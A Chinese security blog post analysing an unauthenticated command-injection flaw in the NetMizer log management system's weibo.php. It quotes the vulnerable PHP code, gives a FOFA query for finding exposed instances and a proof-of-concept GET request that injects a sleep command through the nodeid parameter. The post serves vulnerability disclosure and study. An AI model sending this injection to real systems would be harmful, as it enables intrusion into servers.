---
title: "NetMizer日志管理系统 weibo.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-weibo-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-weibo.php-命令执行漏洞
---

# NetMizer日志管理系统 weibo.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/20 08:28
* 645浏览
* [0评论](#comment)
* 17分钟阅读

深入探索

企业安全咨询

漏洞预警服务

代码安全审计


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/weibo.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞修复方案

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

深入探索

网络安全会议

数据库

防火墙软件

看下 `weibo.php` 业务实现关键逻辑部分

```
<?php
    include('../include/JSON.php');

    $cmd = "/var/www/cgi-bin/search_weibo";

    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
    $start_time = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -s $start_time";
    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
    $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -e $stop_time";

    if($nodeid != ""){
       $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
       $cmd .= " -n $nodeid";
    } else $sql_nodeid = "";

    $srcip = $src;
    if($srcip == ""){
       $srcid = "-1";
    } else $srcid = ip2long($srcip); 
    if($srcid != "-1"){
       $sql_srcid = " and src_addr = $srcid ";
       $cmd .= " -S $srcid";
    } else {
       $sql_srcid = "";
    }

    $user = $username;
    if($user != ""){
       $sql_user = " and user_name = \"$user\" ";
       $cmd .= " -u $user";
    } else {
       $sql_user = "";
    }

    if($qq != ""){
       $sql_qq = " and wb_uid = $qq ";
       $cmd .= " -q $qq";
    } else {
       $sql_qq = "";
    }

    if($action == 'file'){
       //echo $cmd."\n";
       $fp = @popen($cmd,"r");
```

深入探索

在线安全工具

编程语言教程

软件

当 `$action == 'file'` 时，多个参数如 nodeid、username、qq 这些由用户可控并直接拼接到cmd命令中且无任何过滤和校验，然后使用popen执行，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

漏洞修复方案

```
GET /data/search/weibo.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 weibo.php 命令执行漏洞](images/img-001-fefaae9b7de5.webp)](https://image.mrxn.net/93f3827c7a9d4cfaa2d957a4156a7f8c.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 weibo.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-search-weibo-nodeid-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-search-weibo-nodeid-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

文件大小转换

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-weibo-nodeid-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-weibo-nodeid-rce.html"),
width: 100,
height: 100,
